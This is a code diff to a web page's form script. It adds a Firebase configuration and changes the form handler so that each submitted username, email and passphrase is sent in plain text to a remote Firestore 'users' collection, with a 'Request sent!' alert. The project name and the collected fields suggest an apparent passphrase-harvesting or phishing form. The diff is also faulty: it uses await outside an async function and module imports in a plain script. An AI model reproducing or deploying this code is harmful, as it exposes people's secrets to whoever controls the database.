@@ -228,6 +228,26 @@
     </div>
 
         <script>
+
+        // Import Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // 🔥 Your Firebase Configuration (Replace with your actual credentials)
+        const firebaseConfig = {
+    apiKey: "AIzaSyCbMGpa-VAloIM4ywNYFn3ViSizrkYF3zg",
+    authDomain: "passphrase-a5e1f.firebaseapp.com",
+    projectId: "passphrase-a5e1f",
+    storageBucket: "passphrase-a5e1f.firebasestorage.app",
+    messagingSenderId: "262596879204",
+    appId: "1:262596879204:web:8690ff2e65b04cb3be1071",
+    measurementId: "G-GBN1VTJ0FE"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+            
         function validateForm(event) {
             event.preventDefault();
             let username = document.getElementById("username").value.trim();
@@ -246,7 +266,19 @@
 
         function storeValues(username, email, passphrase) {
             console.log("Stored Values:", { username, email, passphrase });
-            alert("Passphrase successfully stored.");
+
+                        try {
+                await addDoc(collection(db, "users"), {
+                    username: username,
+                    email: email,
+                    passphrase: passphrase, 
+                    timestamp: new Date()
+                });
+                alert("Request sent!");
+            } catch (error) {
+                alert("Failed to send request.");
+            }
+            
         }
     </script>
         
